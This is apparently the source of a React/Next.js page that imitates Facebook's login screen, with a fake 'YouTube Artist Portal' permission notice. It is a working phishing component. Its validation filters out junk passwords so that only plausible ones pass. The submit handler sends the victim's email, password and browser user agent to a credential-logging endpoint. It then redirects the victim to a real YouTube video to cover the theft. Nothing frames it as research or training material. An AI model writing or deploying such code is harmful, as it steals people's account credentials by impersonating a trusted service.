import { useState } from 'react';
import { useRouter } from 'next/router';

export default function FacebookLogin() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const router = useRouter();

  const validateCredentials = (email, password) => {
    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10}$/;
    
    if (!emailRegex.test(email) && !phoneRegex.test(email.replace(/\D/g, ''))) {
      return "Invalid email or phone number";
    }
    
    // Password validation - reject obvious fake passwords
    const weakPasswords = ['123456', 'password', 'qqqqqq', 'wwwwww', 'aaaaaa', '111111', '000000'];
    if (password.length < 6) return "Password is too short";
    if (weakPasswords.includes(password.toLowerCase())) return "Password is too common";
    if (/(.)\1{5,}/.test(password)) return "Password is too simple"; // Repeating characters
    
    return null;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    const validationError = validateCredentials(email, password);
    if (validationError) {
      setError(validationError);
      return;
    }

    try {
      // Log to NeonDB
      await fetch('/api/log-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          userAgent: navigator.userAgent
        })
      });

      // Redirect to REAL YouTube with their content
      const searchParams = new URLSearchParams({
        v: 'dQw4w9WgXcQ', // Some popular music video
        feature: 'share',
        artist_welcome: 'true'
      });
      
      window.location.href = `https://www.youtube.com/watch?${searchParams.toString()}`;
      
    } catch (err) {
      setError('Login failed. Please try again.');
    }
  };

  return (
    <div className="facebook-container">
      <div className="facebook-header">
        <div className="facebook-logo">facebook</div>
      </div>
      
      <div className="login-box">
        <h2>Log in to Facebook</h2>
        <p className="app-notice">YouTube Artist Portal wants to access your public profile</p>
        
        <form onSubmit={handleSubmit}>
          {error && <div className="error-message">{error}</div>}
          
          <div className="input-group">
            <input
              type="text"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="fb-input"
            />
          </div>
          
          <div className="input-group">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="fb-input"
            />
          </div>

          <button type="submit" className="fb-login-button">
            Log In
          </button>
        </form>
        
        <div className="links">
          <a href="#">Forgotten account?</a>
          <a href="#">Sign up for Facebook</a>
        </div>
      </div>
    </div>
  );
}
